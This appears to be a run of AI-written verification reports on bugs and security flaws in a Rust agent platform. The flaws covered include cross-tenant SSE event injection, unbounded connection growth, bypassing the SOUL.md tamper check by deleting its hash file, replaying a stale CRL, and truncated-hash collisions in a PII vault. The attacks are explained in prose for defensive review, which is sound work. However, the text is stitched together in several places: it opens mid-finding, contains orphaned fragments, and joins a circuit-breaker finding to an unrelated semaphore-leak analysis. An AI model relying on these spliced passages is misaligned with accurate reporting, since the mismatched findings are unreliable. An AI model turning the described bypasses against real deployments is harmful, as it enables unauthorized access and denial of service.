The finding's stated mechanism is even slightly understated: llm_fallback.rs:164-175 does NOT write an evolution-events JSONL line at all — it constructs a *different* type, `duduclaw_security::audit::AuditEvent::new("llm_fallback_triggered", ...)`, and appends via `append_audit_event` to `security_audit.jsonl` (a separate file/pipeline). So real fallback events never even reach the evolution-events directory that `sync_from_files` scans (collect_jsonl_files), meaning the count is 0 regardless of the deserialization branch. Either path yields the same observable defect: with no production writer feeding `llm_fallback_triggered` rows into `audit_index`, the dashboard-surfaced `fallback_trigger_rate` is permanently 0.0 regardless of actual fallback volume. HIGH/correctness stands.

summary: Out-of-process (agent/MCP) task status changes never produce a TaskStatusChanged event, so `task_status_changed` autopilot rules silently fail for agent-driven transitions.
failure_scenario: An operator creates an autopilot rule with trigger_event="task_status_changed" (e.g. when a task moves to "done" -> notify on-call). A sub-agent completes its task via the MCP `tasks_complete` tool, which calls append_bus_event(home_dir, "task.updated", ...) (mcp.rs:9390). `row_to_event` (autopilot_engine.rs:786-794) only maps "task.created"/"task.updated"/"activity.new" — "task.updated" becomes AutopilotEvent::TaskUpdated, never TaskStatusChanged. The rule never fires. The same transition driven from the dashboard WebSocket DOES emit TaskStatusChanged (handlers.rs:7068), so the behavior is inconsistent and the agent-as-teammate path is the one that breaks. No error is logged; the operator just sees a rule that mysteriously works from the UI but not from agents.
verify_reasoning:
The full failure chain is constructible from the code.

(1) Agent/MCP path emits only "task.updated": In crates/duduclaw-cli/src/mcp.rs, every agent-driven status transition appends a "task.updated" bus event — handle_tasks_complete (line 9390), handle_tasks_claim (9353), handle_tasks_block (9428), handle_tasks_update (9319) all call `append_bus_event(home_dir, "task.updated", &task_row_to_json(&updated))`. There is no "task.status_changed" string ever appended by the MCP server.

(2) row_to_event never produces TaskStatusChanged: crates/duduclaw-gateway/src/autopilot_engine.rs:786-794 maps only "task.created"=>TaskCreated, "task.updated"=>TaskUpdated, "activity.new"=>ActivityNew, `_ => None`. So a "task.updated" row from MCP becomes AutopilotEvent::TaskUpdated — never TaskStatusChanged. spawn_events_db_poll (line 831) re-emits exactly what row_to_event returns.

(3) Rule matching is exact-string on event_name(): process_event (autopilot_engine.rs:415-420) filters rules with `r.enabled && r.trigger_event == event_name`, where event_name = TaskUpdated.event_name() = "task_updated" (line 66). A rule with trigger_event=="task_status_changed" (the canonical name from line 67) therefore never matches a TaskUpdated event. No fallback/aliasing exists.

(4) Dashboard path IS different (confirms inconsistency): handlers.rs handle_tasks_update (lines 7044-7078) captures prev_status, and when status actually changed (prev != new_status) it directly calls emit_autopilot_event(AutopilotEvent::TaskStatusChanged {...}) at line 7068 — bypassing the events.db string bus. So the very same logical transition fires task_status_changed rules from the UI but not from agents.

(5) Silent failure: process_event simply finds zero matching rules and does nothing; no warn!/error! is logged for an unmatched event. The operator sees a rule that works from the dashboard and mysteriously never fires for agent (tasks_complete) transitions — exactly the agent-as-teammate path. The finding's cited locations and behavior are accurate (only the file path differs: the MCP server lives in crates/duduclaw-cli/src/mcp.rs, not crates/duduclaw-gateway/src/mcp.rs, but append_bus_event with "task.updated" at line 9390 is exactly as claimed).

summary: task_status byte-slices step output at [..min(200)], panicking when byte 200 lands inside a multi-byte UTF-8 codepoint.
failure_scenario: A task step result (StepResult.output: String, task_spec.rs:125) contains zh-TW / CJK text longer than 200 bytes — extremely common for agent outputs. `&result.output[..result.output.len().min(200)]` slices at byte index 200; if that byte is in the middle of a 3-byte CJK character, Rust panics ('byte index 200 is not a char boundary'), crashing the task_status handler and returning no result for an otherwise valid task_id.
verify_reasoning: crates/duduclaw-cli/src/mcp.rs:3204 inside handle_task_status does: format!("\n      Output: {}...", &result.output[..result.output.len().min(200)]). result.output is a String (crates/duduclaw-gateway/src/task_spec.rs:125 `pub output: String`). The slice index N = output.len().min(200); when output.len() > 200, N = 200. Rust's str byte-range indexing `&s[..200]` panics ("byte index 200 is not a char boundary") if byte 200 is not on a UTF-8 char boundary. CJK characters are 3 bytes each; 200 % 3 != 0, so any step output composed of CJK text longer than 200 bytes lands byte 200 mid-codepoint with high probability, panicking the task_status handler. No guard exists (no is_char_boundary / floor_char_boundary / char_indices), unlike the safe truncation pattern used elsewhere in the codebase. The panic crashes the handler so a valid task_id returns no result. The failure is directly constructible: a single step result like "甲乙丙丁..." (67+ CJK chars) reaches byte index 200 inside the third byte of a character. Verified there is no surrounding catch_unwind or fallback on this path.

summary: stream_call_handler pushes tool results to any caller-supplied conn_id with no ownership check, allowing cross-tenant SSE event injection/eavesdropping setup.
failure_scenario: Client B authenticates with its own valid Bearer key and POSTs /mcp/v1/stream/call?conn_id=<client-A-conn-id> with a tool call. The handler authenticates B successfully, dispatches the tool under B's principal, then calls state.sse_store.push_event(&query.conn_id, ...) which looks up the connection purely by conn_id. The 'tool_progress'/'tool_result' events (including the full JSON-RPC result body) are broadcast into client A's live SSE stream. conn_id is a v4 UUID but is echoed back to A in the 'connected' event and is the only access token for the stream; SseEventStore stores no owning client_id, so there is no binding between the principal that opened the stream and the principal allowed to push to it.
verify_reasoning:
stream_call_handler (crates/duduclaw-cli/src/mcp_http_server.rs:379-430) authenticates the caller (authenticate_bearer, line 385) but then takes the SSE target conn_id solely from the caller-supplied query param (StreamCallQuery.conn_id, struct line 374-377; let conn_id = query.conn_id.clone(), line 402). It dispatches the tool under the CALLER's own principal/ns_ctx (line 415) and pushes both events to that arbitrary conn_id: push_event(&conn_id, "tool_progress", ...) line 410 and push_event(&conn_id, "tool_result", &jsonrpc.to_string()) line 423. No check ties conn_id to the authenticated principal.

SseEventStore::push_event (mcp_sse_store.rs:122-133) resolves the connection purely by string key — inner.connections.get_mut(conn_id)? — and broadcasts via entry.push_event → self.tx.send(...) (line 60). ConnectionEntry (lines 36-43) stores only buffer, tx, last_active — there is no client_id/owner field, and register_connection (lines 111-117) accepts only (conn_id, tx), never recording the opening principal. So there is provably zero binding between the principal that opened the stream and the principal allowed to push to it.

stream_handler does have principal.client_id (line 339) and even echoes it in the connected event (line 357), but never persists it into the store, confirming the missing-binding root cause. Consequence: Client B (own valid Bearer key) POSTing /mcp/v1/stream/call?conn_id=<A's conn_id> with a tool call causes B's full JSON-RPC tool_result body to be broadcast into A's live SSE stream and recorded into A's replay ring buffer — exactly the cross-tenant SSE injection/eavesdropping-setup described. The only friction is that B must obtain A's v4-UUID conn_id (the report itself acknowledges this and treats absence-of-binding as the defect). Existing tests only assert that some valid auth is required (stream_call_endpoint_returns_401_without_auth, lines 765-782); none assert conn_id ownership, matching the gap. The finding is constructible directly from the code, not merely plausible.

summary: SSE connections are registered but never evicted in production and the endpoint has no rate limit, giving unbounded memory growth / DoS.
failure_scenario: Each GET /mcp/v1/stream call allocates a broadcast::channel(256) and inserts a ConnectionEntry into SseEventStore.connections keyed by a fresh UUID, but unlike call/stream_call this handler never invokes rate_limiter.check, so a single authenticated key can open thousands of streams. SseEventStore::evict_idle exists but is only ever called from tests (grep shows no production scheduler invokes it), so entries (each with a 256-slot broadcast buffer + ring buffer) accumulate forever. A client that opens and drops connections in a loop grows the HashMap and channel memory without bound until OOM.
verify_reasoning:
CONFIRMED. All three legs of the claim are verifiable in the real source.

(1) No rate limit on stream_handler: `mcp_http_server.rs:319-370` registers the connection at line 336 (`state.sse_store.register_connection(&conn_id, tx)`) after allocating `broadcast::channel::<String>(256)` at line 335. It never calls `state.dispatcher.rate_limiter.check(...)`. By contrast `call_handler` does so at line 280 and `stream_call_handler` at line 394 (both `OpType::HttpRequest`, 60/min). So the GET /mcp/v1/stream path has no per-key quota — one authenticated key can open arbitrarily many streams.

(2) No auto-removal on disconnect: `ConnectionEntry` holds the broadcast Sender `tx` (mcp_sse_store.rs:40) inside `connections: HashMap<String, ConnectionEntry>` (line 88). The handler keeps only the receiver `rx` (mcp_http_server.rs:335). When the client drops the SSE response, only `rx` is dropped; `tx` stays alive in the store HashMap. There is no Drop impl, no `remove_connection`, no cleanup on stream end — so each register inserts a permanent entry (256-slot broadcast buffer + a VecDeque pre-reserved to 1024 via `with_capacity(RING_BUFFER_CAPACITY)`, line 48).

(3) evict_idle is never run in production: `evict_idle` (mcp_sse_store.rs:157) is the only cleanup; its own doc says "Should be called periodically by a background task." A repo-wide grep (`grep -rn evict_idle|sse_store|SseEventStore .../crates --include=*.rs`) finds it referenced ONLY in its own definition and two unit tests (lines 294, 304); no tokio interval / scheduler / spawned task invokes it anywhere. Outside the two SSE files, `sse_store` appears only as a module declaration in lib.rs:29.

Therefore a client that loops open-then-drop on GET /mcp/v1/stream with a single valid key inserts ConnectionEntry records that are never evicted and never freed on disconnect, growing the HashMap + per-entry buffers without bound until OOM. Authentication is required (401 tests at lines 656-665, 749-763), so this is an authenticated resource-exhaustion / DoS — exactly as the finding states ("a single authenticated key").

Minor inaccuracy that does not refute the finding: the finding called the broadcast buffer "256-slot broadcast buffer + ring buffer"; the ring buffer capacity is actually 1024 (RING_BUFFER_CAPACITY, line 18), and the VecDeque pre-reserves that capacity at creation, which if anything makes the per-entry footprint larger, strengthening the memory-growth concern.

summary: Subprocess PTC reads stdout/stderr only after child.wait(), so any script producing >~64KB of stdout deadlocks the OS pipe buffer until the timeout kills it.
failure_scenario: A Python/Bash script that prints more than one pipe buffer (~64KB on Linux) to stdout fills the kernel pipe; the child blocks on write() and never exits because nothing is draining child_stdout (it is only read inside the Ok(Ok(status)) arm AFTER child.wait()). child.wait() therefore never returns; the tokio::time::timeout fires, the process is SIGKILLed (exit 124 'timed out'), and ALL output is lost. A normally-fast, large-output script is reported as a timeout failure. Fix: spawn concurrent reads (or read_to_end via tokio::join!) alongside child.wait(), e.g. let (status, out, err) = tokio::join!(child.wait(), read stdout, read stderr) under the timeout.
verify_reasoning:
In crates/duduclaw-cli/src/ptc/sandbox.rs PtcSandbox::execute, stdout/stderr are piped (lines 226-227 `.stdout(Stdio::piped())` / `.stderr(Stdio::piped())`). The handles are taken (lines 232-233 `let mut child_stdout = child.stdout.take(); let mut child_stderr = child.stderr.take();`) but are NOT read at that point. Line 235 then does `let result = tokio::time::timeout(timeout, child.wait()).await;` — it awaits child exit with nothing draining the pipes. The actual reads (`read_to_end`) happen only inside the `Ok(Ok(status))` arm at lines 249-258, i.e. AFTER `child.wait()` returns.

This is the textbook pipe-buffer deadlock. A script that writes more than one OS pipe buffer (~64KB on Linux, smaller on macOS/Windows) to stdout fills the kernel buffer; the child blocks in `write()` and cannot exit; `child.wait()` therefore never completes. The `tokio::time::timeout` fires after `req.timeout_ms`, control enters the `Err(_)` arm (lines 275-287) which kills the child and returns `exit_code: 124`, `stdout: String::new()`, `stderr: "Script execution timed out"`. So a fast, large-output script is misreported as a timeout and all its output is discarded — exactly the claimed scenario.

Note the bound: per the `tokio::time::timeout`, the gateway does not hang indefinitely; the failure is capped at the configured timeout, and the `.take(read_limit)` cap at lines 251/256 means correctly-draining code would never OOM. But that does not refute the finding — the correctness bug (large-output script wrongly classified as timeout, output lost) is real and reachable for any output exceeding the pipe buffer.

Fix is as suggested: drain stdout/stderr concurrently with `child.wait()`, e.g. `tokio::join!(child.wait(), out.read_to_end(...), err.read_to_end(...))` under the single timeout. The container path (execute_in_container, line 394) reads via `runtime.logs()` after the fact and is not affected by this particular pipe-buffer issue.

summary: Container PTC mode never exposes the host UDS socket to the container (no mount, no DUDUCLAW_PTC_SOCKET env), so every MCP tool call from a containerized script fails.
failure_scenario: execute_in_container builds ContainerConfig with network_access=false and only mounts tmp_dir read-only at /workspace; it never bind-mounts rpc_server.socket_path() into the container nor sets DUDUCLAW_PTC_SOCKET in the container env. The client stub raises 'DUDUCLAW_PTC_SOCKET not set' (or socket.connect fails). Any script relying on call_tool()/ptc_call (the entire reason PTC exists) silently produces errors/empty output while reporting exit_code 0 and tool_calls_count 0, making the container path effectively a no-network sandbox with no tool bridge. Subprocess mode works only because execute() sets the env and shares the host filesystem.
verify_reasoning:
The container PTC path provides no mechanism to expose the host UDS socket or set DUDUCLAW_PTC_SOCKET inside the container, exactly as claimed — and it is in fact worse.

1) sandbox.rs `execute_in_container` (lines 348-363) builds `ContainerConfig` whose ONLY mount is `tmp_dir` -> `/workspace` read-only (lines 352-356) and sets `network_access: false` (line 358). It never adds a MountConfig for `rpc_server.socket_path()` and there is no env field to set DUDUCLAW_PTC_SOCKET.

2) `ContainerConfig` (duduclaw-core/src/types.rs:247-272) has NO env field and no command field — there is no struct path to inject DUDUCLAW_PTC_SOCKET at all. The `ContainerRuntime` trait (traits.rs:30-48) likewise exposes only create(config)/start/stop/remove/logs/health_check — no env, no cmd.

3) Docker backend `create` (docker.rs:33-99) builds `binds` solely from `config.additional_mounts` (lines 37-41) → the socket is never bind-mounted. The `Config` (lines 78-84) sets no `env` (DUDUCLAW_PTC_SOCKET unset) AND sets no `Cmd`/`Entrypoint`, so the container runs DEFAULT_IMAGE's default command and never executes `/workspace/script.py`. The user script does not run at all.

4) Consequence in the client stub: python_client_stub (sandbox.rs:28-30) raises RuntimeError("DUDUCLAW_PTC_SOCKET not set ...") and bash_client_stub (line 60) `:?`-aborts. Even setting that aside, no socket is reachable since the UDS path isn't mounted and network_access=false.

5) Reporting is misleading exactly as claimed: in `execute_in_container` the success arm hard-codes `Ok(Ok(output)) => (output, 0)` (line 397) so exit_code=0 regardless, and `tool_calls_count: rpc_server.call_count()` (line 418) stays 0 because no script ever connected (call_count only increments on real RPC connections to the host socket).

By contrast the subprocess `execute` path works because it sets `.env("DUDUCLAW_PTC_SOCKET", rpc_server.socket_path()...)` (line 225) and shares the host filesystem/socket. The finding is accurate; the container path is a no-tool-bridge sandbox that additionally never even runs the script.

summary: search_facts passes the raw user query straight to FTS5 MATCH without the sanitization that search()/search_layer() apply, so any FTS operator/special char makes the query Err and silently disables both fact injection and fact dedup.
failure_scenario: A user message containing an FTS5 special token (e.g. a quote, colon, '*', or the word 'NEAR'/'OR') reaches search_facts via channel_reply.rs:1065 (fact injection) and channel_reply.rs:1737 (dedup). MATCH raises a syntax error -> search_facts returns Err -> the caller's `.ok()?` / `if let Ok` swallows it. Result: (1) Key Facts are never injected for such turns, and (2) the dedup check is skipped so the same fact is stored again on every turn, growing key_facts unboundedly. Fix: sanitize the query (wrap as a phrase like search() does) before MATCH.
verify_reasoning:
The asymmetry is real and reachable. search() (engine.rs:813-820, comment "Sanitize FTS5 query: strip ALL special characters and operators (BE-H2)") and search_layer() (engine.rs:452-460) both filter `" ' : ^ { } * ( )` and wrap the query as a quoted phrase before MATCH. search_facts (engine.rs:1074) does NO sanitization: engine.rs:1083 runs `key_facts_fts MATCH ?2` with the raw `query` bound at engine.rs:1090, against an FTS5 virtual table (engine.rs:664). An FTS5 special token (quote, colon, '*', or boolean op like OR/NEAR) makes MATCH raise a syntax error, which surfaces as Err via the query_map error map at engine.rs:1102.

Both callers swallow the Err:
1. Fact injection (channel_reply.rs:1065): `engine.search_facts(&aid,&query,3).ok()?` — Err -> None -> the `## Key Facts About This User` block is never appended (channel_reply.rs:1069-1071). The query is `sanitized_text` (channel_reply.rs:1061), and sanitized_text only strips role-prefix injection (channel_reply.rs:923-927); worse, for any authenticated user it is prefixed with `[sender_id: {user_id}]` containing a colon (channel_reply.rs:931) — a FTS5 column-filter operator — so MATCH breaks on essentially EVERY authenticated channel turn, not just messages that happen to contain special tokens. This makes the injection-disable far more universal than the finding states.
2. Dedup (channel_reply.rs:1737): `if let Ok(existing) = ...search_facts(...,fact,1)` — when the extracted `fact` line contains a special char, Err skips the whole block, so control falls through to `store_fact` unconditionally (channel_reply.rs:1743), re-storing the fact every turn and growing key_facts unboundedly for such facts.

The fallback at engine.rs:1110 (get_recent_facts on empty result) only runs when search_facts returns Ok(empty); it does NOT execute on Err, so it does not mitigate either path. Fix as proposed: apply the same char-filter + quoted-phrase wrapping search()/search_layer() use before MATCH.

summary: Resume download corrupts the file when the server returns 200 (full body) in response to a Range request, because append/truncate are keyed on existing_size rather than the actual response status.
failure_scenario: A .partial file already has N bytes from a prior interrupted download. download_with_resume sends `Range: bytes=N-`. A mirror/CDN that ignores Range responds 200 with the FULL file body (status 200 passes the `is_success() || 206` check at line 160). The file is opened with append(existing_size>0)=true / truncate(false) (lines 180-185), so the entire fresh body is appended after the stale N bytes. The corrupted .partial is renamed to the final .gguf (line 231) and the CLI prints `模型下載完成！`. The user later gets an opaque GGUF parse/load failure with no hint that the download was corrupt. Fix: when existing_size>0 but the response status is 200 (not 206), restart from offset 0 (truncate).
verify_reasoning:
The append/truncate decision is keyed on existing_size, never on response status, and a 200 response to a Range request passes the success guard, so the full body is appended after stale partial bytes.

Trace in crates/duduclaw-inference/src/model_registry/downloader.rs (download_with_resume):
- L138-142: existing_size = metadata of .partial (N bytes from a prior interrupted download).
- L152-155: because existing_size > 0, it sends `Range: bytes={existing_size}-`.
- L160: the only status guard is `if !resp.status().is_success() && resp.status().as_u16() != 206`. HTTP 200 satisfies `is_success()`, so a server that ignores Range and returns 200 with the FULL body passes this check (no error, no restart).
- L167-177: for non-206 status, total_bytes = `resp.content_length()` (full file length for a 200 full body).
- L180-186: file opened with `append(existing_size > 0)` = append(true) and `truncate(existing_size == 0)` = truncate(false). The N stale bytes are preserved.
- L189-225: `downloaded` starts at existing_size and the entire fresh body is streamed via `file.write_all(&chunk)`, appended after the stale N bytes.
- L227-231: file flushed and the corrupt .partial (N stale bytes + full body = N + full_size bytes) is renamed to the final .gguf via `tokio::fs::rename(&partial, &dest)`.
- L233-237: logs "Model download complete" with no integrity check; CLI reports success. The user later hits an opaque GGUF parse/load failure.

No guard anywhere distinguishes 206 (true partial content, append correct) from 200 (full body, must truncate). RFC 7233 explicitly permits a server/CDN to ignore Range and return 200, so the triggering server behavior is realistic, and given that behavior the corruption is deterministic and silent. The proposed fix (when existing_size > 0 and status is 200, restart from offset 0 / truncate) is correct. Severity HIGH and correctness dimension are justified: silent on-disk data corruption of the model file.

summary: SOUL.md drift detection self-heals when the stored hash file is missing, letting an attacker bless tampered content as the new baseline by deleting the hash.
failure_scenario: check_soul_integrity calls read_stored_hash (line 129); if it returns None it falls into the None arm (168-184) which stores the *current* file's hash as the trusted baseline and returns intact:true. An attacker who edits agents/<id>/SOUL.md and removes ~/.duduclaw/soul_hashes/<id>.hash causes the next heartbeat tick to silently re-fingerprint the malicious SOUL.md as legitimate — drift is never reported. The doc comment at line 50 only defends against tampering both files simultaneously, not against deleting the hash. The baseline used for ASI (compute_asi_from_history, 256-285) reads from the attacker-writable .soul_history dir, compounding the bypass.
verify_reasoning:
The failure is directly constructible from the code in crates/duduclaw-security/src/soul_guard.rs.

(1) read_stored_hash (lines 70-78) returns None when the hash file is absent: std::fs::read_to_string(&path).or_else(...legacy...).ok() yields None on both failures.

(2) check_soul_integrity (line 129) binds `stored = read_stored_hash(...)`. With stored == None, control reaches the None arm (lines 168-184), which calls store_hash(agent_dir, &current) re-fingerprinting whatever SOUL.md is currently on disk, and returns SoulCheckResult { intact: true, message: "SOUL.md fingerprint initialized (first run)", ... }. There is no distinction between a genuine first run and a deleted-hash attack.

- record_tokens_used: `state.token_reserved = state.token_reserved.saturating_sub(1)` (line 539)
- increment_concurrent_tasks: `state.pending_tasks = state.pending_tasks.saturating_sub(1)` (line 554)

The release paths are decoupled and semantically tied to write/task work: record_tokens_used (line 539: `token_reserved.saturating_sub(1)`) is documented "成功執行操作後呼叫"/record real token usage, and increment_concurrent_tasks (line 554: `pending_tasks.saturating_sub(1)`) "確認並發任務計數". summary: Token hash is HMAC-SHA256 truncated to 4 bytes (32 bits) and the vault primary key is the token string alone, so collisions cause INSERT OR REPLACE to clobber a different mapping -> wrong-cleartext leak or data loss.

With ~77k distinct redacted values across the shared vault there is a ~50% chance two distinct (category,original) pairs collide to the same `<REDACT:CAT:hhhhhhhhh>` string; the second insert REPLACES the first row (overwriting agent_id/session_id/original_enc). Result: (a) the earlier session's redacted text now restores to the WRONG plaintext = cross-entity PII leak when agent/session happen to match, or (b) lookup_mapping's agent/session guard returns None and the user gets a stuck `<REDACT:...>` token (silent data loss). 32 bits is far too small for a fail-closed PII vault keyed solely on the truncated hash.

All three load-bearing facts verified in the real source (cited paths differ only by the `vault/` subdir the finding omitted; line numbers and content match exactly):

2. Vault PK is the token string alone — vault/schema.rs:13 `token TEXT PRIMARY KEY`; agent_id (line 17) and session_id (line 18) are plain columns, NOT part of the PK. Only secondary index `idx_session(agent_id, session_id)` (line 28), which does not enforce uniqueness.
3. `insert_mapping` uses `INSERT OR REPLACE` — vault/store.rs:130-149, binding `token` as the conflict key. On PK collision SQLite deletes the existing row and inserts the new one, overwriting original_enc/agent_id/session_id.

The token wire string is `<REDACT:CATEGORY:hash8>` (token.rs:42) and carries NO agent/session bits, so two redactions anywhere in the shared vault that produce the same category+hash collapse to the same PK. The birthday bound the finding cites is correct: per category over a 32-bit space, ~77k distinct values → P(collision) ≈ 1 - e^(-77000²/2^33) ≈ 50%.

Failure modes are both reachable from the code:
- Data loss (b): after a colliding second insert REPLACEs the first row, the first token's lookup hits lookup_mapping's guards — store.rs:197 `if row.agent_id != agent_id { return Ok(None) }` and store.rs:200 `if !row.cross_session && row.session_id.as_deref() != session_id { return Ok(None) }` — returns None, so restore() leaves the token in place (pipeline.rs:214-222 RestoreMiss → TokenAction::Keep): a stuck `<REDACT:...>` token = silent data loss.
- Wrong-plaintext leak (a): when the colliding survivor shares the same agent_id AND (same session_id, or cross_session=true), both guards pass and store.rs:209-218 decrypts the WRONG original; pipeline.rs:235-244 then emits RestoreOk and substitutes the wrong cleartext = cross-entity PII leak. The cross_session_stable path (pipeline.rs:127-140, session_for_vault=None, cross_session=true) makes the same-agent collision domain span all sessions, widening (a).

The per-session salt (derive_session_salt, token.rs:136) narrows the leak variant to a single session's value set, so the headline 77k/50% figure most directly bounds the data-loss variant rather than the leak; but the leak is still constructible and the cross_session_stable salt domain is vault-wide. This is a fail-closed PII vault (pipeline.rs:97-98, 135), so collision-driven clobbering of mappings is a genuine HIGH correctness defect. Nothing in the code guards against the truncated-hash PK collision.

summary: Interactive invoke writes the raw prompt followed by a single CR; any newline inside the prompt submits early in the Claude REPL and splits one logical turn into several.

`/`` stripping/escaping is applied anywhere on the write path; a grep of the whole cli-runtime crate finds bracketed-paste/newline handling only on the RESPONSE path (envelope.rs:208 `replace("
","

"` plus per-turn `"</role>
"` lines plus `"</conversation_history>

"` before the current message — i.e. the prompt is unavoidably multi-line. Even in the no-history branch (`user_message.to_string()`), any embedded `
`/`` from a raw LINE/Telegram/Discord multi-line message survives intact.

The `_ = self.inner.pty.drain_buffer()` at session.rs:483 drains only BEFORE the write and cannot undo a prompt that was split mid-turn. summary: drain_buffer() only empties rx_buffer and never pulls chunks still sitting in the reader mpsc channel, so the pre-invoke 'drain lingering bytes' step does not actually discard prior-turn output.

On the next read_until they flow into `raw`, and because try_extract_interactive_answer (session.rs:836) pairs the LAST two INTERACTIVE_SENTINEL occurrences, a leftover closing sentinel from the previous turn combined with this turn's sentinels can yield a wrong/empty payload. Core mechanism is provable from the code. `drain_buffer()` (pty.rs:298-301) is `std::mem::take(&mut *rx_buffer)` — it touches ONLY `rx_buffer`. `rx_buffer` is written in exactly one place: pty.rs:280, inside `read_until` (`self.inner.rx_buffer.lock().push_str(&c)`). The reader-pump thread (spawn_reader_pump, pty.rs:347-405) pushes decoded chunks into the bounded 64-slot mpsc channel `reader_rx` (created pty.rs:193). Those chunks only migrate into `rx_buffer` when someone calls `read_until` and recv()s them. Between invokes no task calls `read_until`, so TUI-redraw/prior-turn bytes accumulate in the mpsc channel, NOT in `rx_buffer`.

session.rs:478-483 is the interactive pre-write step. Its comment (lines 479-482) states it drains "lingering bytes ... from prior turns + TUI redraws BEFORE we write — that way our collector sees only this turn's bytes." Verdict is CONFIRMED rather than PLAUSIBLE because the load-bearing defect (drain_buffer cannot evict channel-queued bytes; the per-turn drain is therefore a no-op for exactly the bytes it claims to clear) is fully provable from the lines cited. The downstream wrong-payload outcome is genuinely reachable but its frequency depends on TUI redraw timing replaying a sentinel — a realistic interactive-CLI behavior, not a guaranteed-every-turn event. The fix is to drain like the boot path (loop read_until with a short window) rather than calling bare drain_buffer().

summary: HALF_OPEN has no timeout/re-arm, so a leaked probe_inflight slot wedges the breaker into rejecting all traffic forever.

The HALF_OPEN branch then always hits `probe_inflight >= probe_success_required` (1>=1) and returns CircuitOpen for every subsequent call. PRONG 2 — TOCTOU between check and record (structurally CONFIRMED):

In crates/duduclaw-cli-runtime/src/pool.rs, `semaphores: DashMap<String, Arc<Semaphore>>` (line 213) is only ever inserted into — `acquire()` at lines 296-300 does `self.semaphores.entry(cache_key.clone()).or_insert_with(|| Arc::new(Semaphore::new(...)))` on EVERY acquire. The three reclamation paths all touch only `sessions`, never `semaphores`: `tick_eviction` (lines 341-361, `self.sessions.remove`), `remove_if_present` (278-287, `self.sessions.remove`), `shutdown` (363-372, `self.sessions.remove`), and `invalidate` (414-419, `pool.sessions.remove`). The supervisor holds no semaphores. So idle/unhealthy session eviction reclaims the PtySession but leaves the per-key Arc<Semaphore> resident forever.

The cache_key is fully attacker-influenced: cache_key() (lines 94-103) = agent_id:cli_kind:bare_mode:account_id:model, and the worker's handle_invoke builds the AgentKey from request params (server.rs line 528, AgentKey::with_account_and_model from params.agent_id/account_id/model). The HIGH-4 fix at server.rs:469-482 is exactly the guard the finding describes, and its own comment confirms the vuln ("Each unique value creates a new entry in PtyPool::semaphores (DashMap with no eviction)") — but it only bounds per-value LENGTH (MAX_AGENT_ID_LEN=128, MAX_ACCOUNT_ID_LEN=256), not the COUNT of distinct keys. model is allowlist-validated (≤128 chars) but still unbounded in cardinality. A bearer-token holder can loop Invoke with distinct agent_id/account_id/model triples, each within the length caps, minting a new Arc<Semaphore> per unique key with no upper bound for the long-lived managed worker's lifetime → unbounded memory growth / eventual OOM. Each leaked Semaphore is small, so it is a slow leak rather than instant DoS, but it is genuinely unbounded and unreclaimed, matching the HIGH performance claim.

summary: Per-account OAuth isolation is silently non-functional: distinct account_id values key distinct pooled sessions but every spawned CLI uses the same ambient ~/.claude OAuth, defeating rate-limit/budget isolation.
failure_scenario: spawn_session_default binds key.account_id only to `_account_id_for_future_env_injection` and never injects per-account env into SpawnOpts. An operator running multi-OAuth rotation (a headline DuDuClaw feature) routes account A and account B to the worker; the pool creates two sessions (different cache_key) but both `claude` children authenticate with whatever single OAuth lives in ~/.claude/keychain. Result: all traffic bills/exhausts one account regardless of the rotator's intended account, per-account 24h billing cooldowns and budget caps are silently bypassed, and the rate-limit-isolation invariant the rotator relies on is broken. The deferral is only documented in a code comment; callers get no runtime error.
verify_reasoning:
CONFIRMED by source. In crates/duduclaw-cli-worker/src/server.rs::spawn_session_default, line 317 binds `key.account_id` only to `let _account_id_for_future_env_injection = &key.account_id;` and never writes it into `opts` — the explicit comment at lines 308-316 admits "the spawned CLI uses whatever ambient OAuth lives in ~/.claude/ / keychain. True per-account auth isolation ... requires accepting env_vars in InvokeParams and applying them to opts.env ... Operators of multi-OAuth-account setups should not rely on the managed worker for account rotation until this lands." 

The transport gap is real: InvokeParams (crates/duduclaw-cli-worker/src/protocol.rs:39-72) has `account_id: Option<String>` but NO `env`/`env_vars` field, so even the JSON-RPC boundary cannot carry per-account OAuth. account_id flows only into AgentKey (pool.rs:78-90) and is used solely for cache_key (pool.rs:100), so distinct account_id values DO key distinct pooled sessions (different cache_key) — but every spawned child authenticates with the same ambient credentials. SpawnOpts::claude_interactive (crates/duduclaw-cli-runtime/src/session.rs:122-132) sets no OAuth env and inherits the worker's environment. So the inner SpawnOpts.env (session.rs:68) is never populated with account-specific tokens by the worker. 

Result exactly matches the claim: rotator routes account A and B → pool creates two sessions → both bill/exhaust the single ambient OAuth → per-account 24h billing cooldowns, budget caps, and rate-limit isolation are silently bypassed, surfaced only in a code comment, with no runtime error to callers.

Severity caveat (does not change verdict, but bounds blast radius): this path is reachable only when an operator opts into the managed PTY worker (`pty_pool_enabled = true` + `worker_managed = true`, both default off per CLAUDE.md) AND relies on multi-OAuth rotation through it — the very combination the comment explicitly warns against. It is loopback-only + bearer-auth, so this is a self-inflicted silent-isolation-bypass in a documented-unsupported configuration rather than an externally-triggerable exploit. The security/billing invariant break is genuine, hence CONFIRMED, but the HIGH rating assumes operators ignore the explicit do-not-rely warning.

summary: CRL revocation can be bypassed by replaying a stale-but-validly-signed CRL; consumer never enforces is_stale() or generated_at monotonicity.
failure_scenario: `SignedCrl::is_stale()` (crl.rs:89) exists but `do_crl_fetch_once` (lines 506-545) only calls `crl.verify()` then `crl.is_revoked()`. A revoked subscription was signed into CRL_t1 but absent from an earlier validly-signed CRL_t0. An attacker controlling the network path / a stale CDN cache / DNS-hijacked `api.duduclaw.tw` serves CRL_t0: `verify()` passes (genuine issuer signature), `is_revoked(subscription_id)` returns false, and the client never downgrades. There is no nonce, no `generated_at` freshness floor, and no persisted last-seen CRL timestamp, so an old CRL is indistinguishable from current and silently re-grants a revoked tier.
verify_reasoning:
The finding is accurate on every point.

Consumer path (license_runtime.rs:506-545, `do_crl_fetch_once`):
- Line 532-536: `crl.verify(&self.registry)` — checks only the Ed25519 signature.
- Line 538: `if crl.is_revoked(&subscription_id)` — checks list membership only.
- That is the entirety of the validation. There is NO call to `is_stale()`, NO comparison of `generated_at` against any prior value, NO persisted last-seen timestamp, and NO nonce. A `grep` for `is_stale|generated_at|last_seen|last_crl|nonce` in license_runtime.rs returns nothing.

The capability exists but is dead:
- `crl.rs:89` `SignedCrl::is_stale()` is defined and unit-tested (lines 180-192), but a repo-wide grep shows its ONLY references are its own definition and its own tests — zero production callers in any crate.
